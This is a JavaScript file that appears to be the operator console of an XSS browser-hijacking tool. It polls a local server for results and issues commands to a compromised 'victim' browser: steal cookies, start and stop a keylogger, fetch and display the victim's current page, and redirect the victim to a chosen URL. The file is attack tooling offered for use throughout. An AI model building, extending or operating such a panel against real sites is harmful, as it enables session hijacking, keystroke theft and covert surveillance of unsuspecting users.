$(function () {

    /////INITIAL SETUP/////
    var input = $('#input');
    var output = $('#output');
    var submitButton = $('#submitButton');
    var clearButton = $('#clearButton');
    var commands = $('#commands');
    var id = $('#id').val();
    var devUrl = "http://localhost:5000/";

    /////EVENT LISTENERS/////

    setInterval(getCommands, 500);

    function getCommands() {
        $.ajax({
                   type: "GET",
                   url: devUrl + "shellCommands/" + id,
                   success: (function (data) {
                       commands.innerHTML = '';
                       commands.html(data);
                   })
               });

    }

    submitButton.click(function () {
        var value = input.val();

        if (value.length != 0) {
            var data = '{"id": "' + id + '", "date": "' + getTime() + '", "type": "msg", "metaData": "' + value + '"}';
            sendCommandToServer(data);
            input.val('');
        }
    });

    input.keyup(function (event) {
        if (event.keyCode == 13) {
            submitButton.click();
        }
    });

    clearButton.click(function () {
        var url = devUrl + 'clear/' + id;
        $.ajax({
                   url: url
               });
        output.val('');
    });

    $('.function').click(function () {
        var dataAttr = $(this).attr('data-function');
        var send = true;
        var value;
        var result

        if (dataAttr == 'msg') {
            result = prompt('What would you like to send?', 'XSS');
            if (result) {
                value = result;
            }
        } else if (dataAttr == 'getCookies') {
            value = dataAttr;
        } else if (dataAttr == 'startLogger') {
            value = dataAttr;
        } else if (dataAttr == 'stopLogger') {
            value = dataAttr;
        } else if (dataAttr == 'getUrl') {
            value = dataAttr;
        } else if (dataAttr == 'getSite') {
            value = dataAttr;
            getCurrentPage();
        } else if (dataAttr == 'goToUrl') {
            result = prompt('Which url you want the victim to visit?', 'http://google.com');
            if (result) {
                var sure = confirm('Are you sure? You will lose the victim');
                if (sure) {
                    value = result;
                } else {
                    send = false;
                }
            } else {
                send = false;
            }
        }

        if (send) {
            var data = '{"id": "' + id + '", "date": "' + getTime() + '", "type": "' + dataAttr + '", "metaData": "'
                    + value + '"}';
            sendCommandToServer(data);
        }
    });


    /////FUNCTIONS/////

    function getCurrentPage() {
        $.ajax({
                   type: "GET",
                   url: devUrl + "currentPage/" + id,
                   success: function (data) {
                       var iFrame = document.createElement('iframe');
                       iFrame.id = 'page';
                       iFrame.src = 'data:text/html;charset=utf-8,' + encodeURI(data);
                       iFrame.setAttribute('width', '798');
                       iFrame.setAttribute('height', '400');
                       document.getElementById('currentPage').innerHTML = '';
                       document.getElementById('currentPage').appendChild(iFrame);
                   }
               });
    }

    function sendCommandToServer(data) {
        $.ajax({
                   type: "POST",
                   url: devUrl + "receiveShellCommand/" + id,
                   data: data,
                   contentType: "application/json; charset=utf-8"
               });
    }


    /////HELPER METHODS/////
    var getTime = function () {
        var date = new Date();
        var hours = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();

        if (hours < 10) {
            hours = '0' + hours;
        }

        if (minutes < 10) {
            minutes = '0' + minutes;
        }

        if (seconds < 10) {
            seconds = '0' + seconds;
        }

        return hours + ':' + minutes + ':' + seconds + ' - ';
    };
});